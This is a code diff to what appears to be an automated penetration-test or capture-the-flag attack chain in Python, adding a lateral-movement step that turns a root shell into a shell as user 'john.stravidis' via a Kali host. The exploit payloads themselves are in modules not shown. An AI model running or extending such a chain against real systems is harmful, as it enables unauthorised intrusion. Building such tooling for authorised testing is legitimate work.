@@ -163,6 +163,17 @@ def _step_privesc(ctx: Context) -> dict[str, Any]:
     return {"root_shell": root_shell}
 
 
+def _step_lateral(ctx: Context) -> dict[str, Any]:
+    from lateral_movement import run as lateral_run
+    john_shell = lateral_run(
+        root_shell=ctx.state["root_shell"],
+        kali_host=ctx.kali_host,
+    )
+    if john_shell is None:
+        raise RuntimeError("lateral movement returned no john.stravidis shell")
+    return {"john_shell": john_shell}
+
+
 def _teardown_close_socket(key: str) -> Callable[[Context], None]:
     def _close(ctx: Context) -> None:
         sock = ctx.state.get(key)
@@ -179,9 +190,10 @@ def _teardown_close_socket(key: str) -> Callable[[Context], None]:
 # ---------------------------------------------------------------------------
 
 CHAIN: list[Step] = [
-    Step("recon", _step_recon),
-    Step("exploit", _step_exploit, teardown=_teardown_close_socket("www_shell")),
-    Step("privesc", _step_privesc, requires=("www_shell",), teardown=_teardown_close_socket("root_shell")),
+    Step("recon",   _step_recon),
+    Step("exploit", _step_exploit,  teardown=_teardown_close_socket("www_shell")),
+    Step("privesc", _step_privesc,  requires=("www_shell",),  teardown=_teardown_close_socket("root_shell")),
+    Step("lateral", _step_lateral,  requires=("root_shell",), teardown=_teardown_close_socket("john_shell")),
 ]
 
 
